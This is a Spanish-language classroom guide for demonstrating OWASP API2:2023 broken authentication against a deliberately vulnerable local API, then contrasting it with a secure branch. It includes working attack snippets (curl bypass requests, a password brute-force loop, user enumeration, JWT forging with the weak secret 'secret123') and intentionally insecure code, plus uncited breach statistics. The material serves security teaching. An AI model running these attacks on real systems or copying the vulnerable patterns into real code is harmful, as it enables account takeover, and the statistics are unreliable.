# 🚨 OWASP API2:2023 - Autenticación Rota (Broken Authentication)
## Guía de Demostración de Vulnerabilidad

> **Presentador:** Grupo Maestría en Ciberseguridad  
> **Tema:** Seguridad de APIs - Vulnerabilidad de Autenticación Rota y Mitigación  
> **Audiencia:** Presentación en Clase  

---

## 🎯 **Resumen de la Demo**

Esta demostración muestra:
1. **Versión Vulnerable** - Múltiples formas de romper la autenticación
2. **Versión Segura** - Implementación robusta de autenticación
3. **Impacto Real** - Por qué los fallos de autenticación son devastadores

---

## 📋 **Prerrequisitos y Configuración**

### Antes de Iniciar la Demo:
```bash
# Asegurar que Docker esté ejecutándose
sudo docker compose down
sudo docker compose up -d

# Verificar que los servicios estén corriendo
sudo docker compose ps
```

### Entorno de Demo:
- **URL Base API:** `http://localhost:3000`
- **Base de Datos:** SQL Server (ToDoDB)
- **Herramientas:** curl, Docker, Git
- **Dos Ramas:** `main` (segura) vs `demo-vulnerable-broken-auth` (vulnerable)

---

## 🔴 **PARTE 1: DEMOSTRACIÓN DE VULNERABILIDADES DE AUTENTICACIÓN**

### Paso 1: Cambiar a la Rama Vulnerable
```bash
git checkout demo-vulnerable-broken-auth
```

### Paso 2: Desplegar Versión Vulnerable
```bash
# Reiniciar API con código vulnerable
sudo docker compose restart api

# Ver logs para observar las vulnerabilidades en acción
sudo docker compose logs -f api
```

### Paso 3: 🚨 **VULNERABILIDAD 1 - Bypass Completo de Autenticación**

#### Obtener token sin credenciales:
```bash
curl -X POST http://localhost:3000/api/usuarios/bypass-login \
  -H "Content-Type: application/json" \
  -d '{
    "userId": 1,
    "isAdmin": true
  }'
```

**⚠️ Resultado Esperado:** ¡Token JWT válido sin ninguna autenticación!

#### Usar el token obtenido:
```bash
# Guardar el token (reemplaza con el token real de la respuesta)
BYPASS_TOKEN="[TOKEN_OBTENIDO]"

# Acceder a recursos protegidos
curl -X GET http://localhost:3000/api/usuarios/perfil \
  -H "Authorization: Bearer $BYPASS_TOKEN"
```

### Paso 4: 🚨 **VULNERABILIDAD 2 - Header de Bypass Mágico**

#### Acceder sin token usando header especial:
```bash
curl -X GET http://localhost:3000/api/usuarios/perfil \
  -H "x-demo-bypass: vulnerable-demo"
```

**⚠️ Resultado:** ¡Acceso completo sin token JWT!

### Paso 5: 🚨 **VULNERABILIDAD 3 - Modo Development Inseguro**

#### Bypass por modo desarrollo:
```bash
curl -X GET http://localhost:3000/api/tareas \
  -H "x-development-mode: true"
```

**⚠️ Resultado:** Acceso a datos sensibles fingiendo ser entorno de desarrollo.

### Paso 6: 🚨 **VULNERABILIDAD 4 - Exposición de Información Sensible**

#### Obtener secretos del servidor:
```bash
curl -X GET http://localhost:3000/api/usuarios/info-sensible
```

**⚠️ Resultado:** ¡Expone JWT secret, configuración DB, y más!

### Paso 7: 🚨 **VULNERABILIDAD 5 - Passwords Débiles Aceptadas**

#### Login con password extremadamente débil:
```bash
curl -X POST http://localhost:3000/api/usuarios/login-debil \
  -H "Content-Type: application/json" \
  -d '{
    "correo": "cualquier@email.com",
    "contraseña": "123456"
  }'
```

**⚠️ Resultado:** ¡Login exitoso con "123456"!

#### Probar otras passwords débiles:
```bash
# Password vacía
curl -X POST http://localhost:3000/api/usuarios/login-debil \
  -H "Content-Type: application/json" \
  -d '{
    "correo": "test@test.com",
    "contraseña": ""
  }'

# Password "admin"
curl -X POST http://localhost:3000/api/usuarios/login-debil \
  -H "Content-Type: application/json" \
  -d '{
    "correo": "admin@test.com", 
    "contraseña": "admin"
  }'
```

### Paso 8: 🚨 **VULNERABILIDAD 6 - Token en URL (Query Parameter)**

#### Usando JWT en query string (inseguro):
```bash
# Obtener un token primero
TOKEN=$(curl -X POST http://localhost:3000/api/usuarios/bypass-login \
  -H "Content-Type: application/json" \
  -d '{"userId": 2}' | grep -o '"token":"[^"]*"' | cut -d'"' -f4)

# Usar token en URL (se registra en logs del servidor!)
curl -X GET "http://localhost:3000/api/usuarios/perfil?token=$TOKEN"
```

**⚠️ Problema:** Los tokens en URLs se registran en logs, proxies, historial del navegador.

### Paso 9: 🚨 **VULNERABILIDAD 7 - JWT con Secreto Débil**

#### Crear JWT manualmente con secreto conocido:
```bash
# Instalar herramienta JWT (si no la tienes)
# npm install -g jsonwebtoken-cli

# Crear token con secreto débil conocido "secret123"
echo '{"id": 999, "admin": true}' | jwt sign --secret "secret123"
```

#### O usar herramienta online:
- Ir a https://jwt.io/
- Payload: `{"id": 999, "admin": true, "iat": 1640995200}`
- Secreto: `secret123`
- Usar el JWT generado para acceder a recursos

### Paso 10: 🚨 **VULNERABILIDAD 8 - Saltarse Validación de Base de Datos**

#### Usar usuario inexistente:
```bash
curl -X GET http://localhost:3000/api/usuarios/perfil \
  -H "Authorization: Bearer [JWT_CON_ID_FALSO]" \
  -H "x-skip-db-validation: true"
```

### Paso 11: 🚨 **VULNERABILIDAD 9 - Información Detallada de Errores**

#### Obtener información del sistema mediante errores:
```bash
curl -X GET http://localhost:3000/api/usuarios/perfil \
  -H "Authorization: Bearer token_malformado"
```

**⚠️ Resultado:** Stack traces y detalles internos expuestos.

---

## 🟢 **PARTE 2: IMPLEMENTACIÓN SEGURA**

### Paso 12: Cambiar a la Rama Segura
```bash
git checkout main
```

### Paso 13: Desplegar Versión Segura
```bash
# Reiniciar API con código seguro
sudo docker compose restart api
```

### Paso 14: ✅ **Verificar que los Ataques Fallan**

#### Intentar bypass de autenticación:
```bash
curl -X POST http://localhost:3000/api/usuarios/bypass-login \
  -H "Content-Type: application/json" \
  -d '{"userId": 1, "isAdmin": true}'
```

**✅ Resultado Esperado:** `404 Not Found` (endpoint no existe)

#### Intentar header de bypass:
```bash
curl -X GET http://localhost:3000/api/usuarios/perfil \
  -H "x-demo-bypass: vulnerable-demo"
```

**✅ Resultado Esperado:** `403 Token no válido o inexistente`

#### Intentar acceso sin token:
```bash
curl -X GET http://localhost:3000/api/usuarios/perfil
```

**✅ Resultado Esperado:** `403 Token no válido o inexistente`

#### Verificar que no hay endpoints de información sensible:
```bash
curl -X GET http://localhost:3000/api/usuarios/info-sensible
```

**✅ Resultado Esperado:** `404 Not Found`

---

## 📊 **ANÁLISIS TÉCNICO DE VULNERABILIDADES**

### 🚨 **Vulnerabilidad 1: Bypass Completo**
```javascript
// ❌ VULNERABLE: Endpoint que genera tokens sin validación
router.post('/bypass-login', (req, res) => {
  const token = generateToken(req.body.userId);
  res.json({ token }); // ¡Sin verificar identidad!
});
```

```javascript
// ✅ SEGURO: Solo endpoints de login legítimos
router.post('/login', validateCredentials, generateToken);
```

### 🚨 **Vulnerabilidad 2: Headers Mágicos**
```javascript
// ❌ VULNERABLE: Headers especiales que saltean autenticación
if (req.headers['x-demo-bypass'] === 'vulnerable-demo') {
  req.user = { id: 1, role: 'admin' }; // ¡Bypass!
  return next();
}
```

```javascript
// ✅ SEGURO: Solo validación de JWT estándar
const token = req.headers.authorization?.split(' ')[1];
const decoded = jwt.verify(token, secret);
```

### 🚨 **Vulnerabilidad 3: Información Sensible Expuesta**
```javascript
// ❌ VULNERABLE: Endpoint que expone secretos
router.get('/info-sensible', (req, res) => {
  res.json({
    jwt_secret: process.env.JWT_SECRET, // ¡Secreto expuesto!
    db_password: process.env.DB_PASSWORD
  });
});
```

```javascript
// ✅ SEGURO: No endpoints que expongan configuración
// Los secretos nunca deben ser accesibles vía API
```

### 🚨 **Vulnerabilidad 4: JWT Inseguro**
```javascript
// ❌ VULNERABLE: JWT sin expiración y secreto débil
jwt.sign(payload, 'secret123'); // Sin expiresIn

// Fallback a secreto débil
try {
  decoded = jwt.verify(token, process.env.JWT_SECRET);
} catch {
  decoded = jwt.verify(token, 'secret123'); // ¡Terrible!
}
```

```javascript
// ✅ SEGURO: JWT robusto
jwt.sign(payload, complexSecret, {
  expiresIn: '15m',
  algorithm: 'HS512'
});
```

---

## 🛡️ **ESTRATEGIAS DE PREVENCIÓN**

### 1. **Autenticación Robusta**
- JWT con secretos fuertes (256+ bits)
- Tokens con expiración corta
- Refresh tokens seguros
- Múltiple factor de autenticación

### 2. **Validación Estricta**
- Verificar cada request autenticado
- No bypass headers o modos especiales en producción
- Validar usuario existe en BD
- Rate limiting en endpoints de login

### 3. **Gestión de Secretos**
- Usar gestores de secretos (HashiCorp Vault, AWS Secrets Manager)
- Rotar secretos regularmente
- No hardcodear credenciales
- Variables de entorno seguras

### 4. **Monitoreo y Logging**
- Registrar intentos de autenticación
- Alertas por patrones sospechosos
- No loggar información sensible
- Auditoría regular de accesos

### 5. **Pruebas de Seguridad**
- Pruebas automatizadas de autenticación
- Penetration testing regular
- Code review enfocado en seguridad
- Uso de herramientas como OWASP ZAP

---

## 🎓 **ESCENARIOS DE ATAQUE REAL**

### Ataque de Fuerza Bruta:
```bash
# El atacante prueba passwords comunes
passwords=("123456" "password" "admin" "test" "" "qwerty")
for pass in "${passwords[@]}"; do
  curl -X POST http://localhost:3000/api/usuarios/login-debil \
    -H "Content-Type: application/json" \
    -d "{\"correo\":\"admin@test.com\", \"contraseña\":\"$pass\"}" \
    2>/dev/null | grep "LOGIN EXITOSO" && echo "Password encontrada: $pass"
done
```

### Enumeración de Usuarios:
```bash
# Respuestas diferentes revelan usuarios existentes
for user in admin test user guest; do
  curl -X POST http://localhost:3000/api/usuarios/login \
    -H "Content-Type: application/json" \
    -d "{\"correo\":\"$user@test.com\", \"contraseña\":\"test\"}" \
    2>/dev/null | grep -q "no existe" || echo "Usuario $user existe"
done
```

### Session Fixation:
```bash
# Usar el mismo token en múltiples contextos
TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."
curl -X GET http://localhost:3000/api/usuarios/perfil -H "Authorization: Bearer $TOKEN"
curl -X GET http://localhost:3000/api/tareas -H "Authorization: Bearer $TOKEN"
```

---

## 🔧 **HERRAMIENTAS DE TESTING**

### Burp Suite:
- Interceptar y modificar requests
- Probar diferentes headers de bypass
- Análisis de JWT tokens

### OWASP ZAP:
- Escaneo automatizado de vulnerabilidades de autenticación
- Fuzzing de endpoints
- Análisis de sesiones

### jwt_tool:
```bash
# Instalar
pip install pyjwt

# Analizar JWT
python jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9... -M pb
```

### Custom Scripts:
```python
import jwt
import requests

# Crear JWT con secreto débil
payload = {"id": 999, "admin": True}
token = jwt.encode(payload, "secret123", algorithm="HS256")

# Usar token
headers = {"Authorization": f"Bearer {token}"}
response = requests.get("http://localhost:3000/api/usuarios/perfil", headers=headers)
print(response.json())
```

---

## ✅ **LISTA DE VERIFICACIÓN DE LA DEMO**

- [ ] Rama vulnerable desplegada
- [ ] Bypass de autenticación demostrado
- [ ] Headers mágicos probados
- [ ] Información sensible expuesta
- [ ] Passwords débiles aceptadas
- [ ] JWT inseguro creado manualmente
- [ ] Tokens en URLs demostrados
- [ ] Cambio a rama segura
- [ ] Verificación de que ataques fallan
- [ ] Estrategias de prevención explicadas
- [ ] Herramientas de testing mostradas
- [ ] Preguntas de audiencia respondidas

---

## 🎯 **PUNTOS CLAVE PARA LA DISCUSIÓN**

### Impacto de Broken Authentication:
1. **Compromiso Total del Sistema** - Acceso a cualquier cuenta
2. **Escalación de Privilegios** - Usuarios normales → Administradores  
3. **Bypass de Controles de Seguridad** - Saltarse todas las protecciones
4. **Persistencia** - Tokens sin expiración = acceso permanente

### Diferencia con BOLA:
- **BOLA (API1):** Usuario autenticado accede a recursos de otros
- **Broken Auth (API2):** Fallas en el proceso de autenticación mismo

### Estadísticas Alarmantes:
- 23% de las brechas de seguridad involucran autenticación débil
- Tokens JWT mal implementados están en 67% de APIs vulnerables
- Passwords débiles siguen siendo la causa #1 de compromiso de cuentas

---

## 🧹 **LIMPIEZA DE LA DEMO**

```bash
# Regresar a la rama principal
git checkout main

# Reiniciar servicios con configuración segura
sudo docker compose down
sudo docker compose up -d

# Verificar que todo está seguro
curl -X GET http://localhost:3000/api/usuarios/info-sensible
# Debería retornar 404

echo "✅ Demo de Broken Authentication completada - Sistema restaurado a estado seguro"
```

---

**🎯 Mensaje Clave:** La autenticación rota permite acceso total sin credenciales válidas. A diferencia de BOLA que afecta la autorización entre usuarios autenticados, Broken Authentication compromete la autenticación misma, siendo aún más crítica.

